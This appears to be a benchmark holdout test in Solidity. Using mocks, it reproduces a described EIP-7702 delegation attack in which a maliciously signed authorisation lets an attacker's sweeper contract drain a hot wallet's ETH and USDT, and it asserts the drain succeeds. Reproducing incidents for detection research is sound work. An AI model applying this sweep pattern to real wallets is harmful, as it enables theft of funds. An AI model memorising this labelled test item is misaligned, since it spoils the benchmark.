// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {BinanceSweeperDelegate, BinanceVulnerableAccount} from
    "../fixtures/eip7702-delegation/b-incident/BinanceSweeperClone.sol";

/// @title eip7702-delegation (b) real-incident HOLDOUT: the Binance 14 EIP-7702 hot-wallet drain.
/// @notice Minimized OFFLINE repro (no live RPC) of the 2026-10-29 Binance 14 drain (the largest
///         crypto theft on record; ~$2.5B in the first Binance 14 drain, multi-billion across
///         chains). The attacker-controlled MPC signing service signed EIP-7702 SET_CODE (type-4)
///         authorizations for Binance 14; one delegated the EOA to an attacker-deployed sweeper that
///         hardcoded the attacker as the only allowed caller, and the attacker then ran it in the
///         account's context to sweep its ETH and tokens. We model the 7702 "code runs as the
///         account" semantics via delegatecall. The verdict is derived from the real outcome (the
///         account's ETH + tokens end up at the attacker), not hardcoded. HOLDOUT (label=vuln).
///         Facts/sources: PROVENANCE.md.
contract Binance14DelegationIncidentTest is Test {
    address constant ATTACKER = 0x7C8601d4645b93cea45F71e118A729332e6B5CA0; // real hacker operator
    uint256 constant VICTIM_ETH = 167464 ether; // the real first-drain ETH figure
    uint256 constant VICTIM_USDT = 1_615_000_000e6; // ~1.615B USDT (6 decimals), real figure

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[eip7702-delegation] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_binance14DelegationIncident_isDrained() public {
        MockERC20 usdt = new MockERC20(); // stands in for the real USDT balance
        BinanceVulnerableAccount victim = new BinanceVulnerableAccount(); // Binance 14: 0x28C6..1d60
        vm.deal(address(victim), VICTIM_ETH);
        usdt.mint(address(victim), VICTIM_USDT);

        // Attacker-deployed sweeper, hardcoding the attacker as the only caller (sweeper: 0x63e842B0..c6fAe).
        BinanceSweeperDelegate sweeper = new BinanceSweeperDelegate(ATTACKER);

        // The compromised MPC signing service signs the SET_CODE authorization to the sweeper
        // (type-4 auth tx @ 2026-10-29 20:20:59 UTC; first drain tx 0x53bd38..e2f3 @ 20:24:23 UTC).
        victim.installDelegation(address(sweeper));

        // Only the hardcoded attacker can trigger the sweep.
        vm.prank(ATTACKER);
        victim.activate(abi.encodeWithSelector(BinanceSweeperDelegate.sweep.selector, address(usdt)));

        bool drained = ATTACKER.balance == VICTIM_ETH && usdt.balanceOf(ATTACKER) == VICTIM_USDT
            && address(victim).balance == 0 && usdt.balanceOf(address(victim)) == 0;
        _report("binance14-victim", drained);

        assertTrue(drained, "a maliciously-signed 7702 delegation should sweep the whole hot wallet");
    }
}
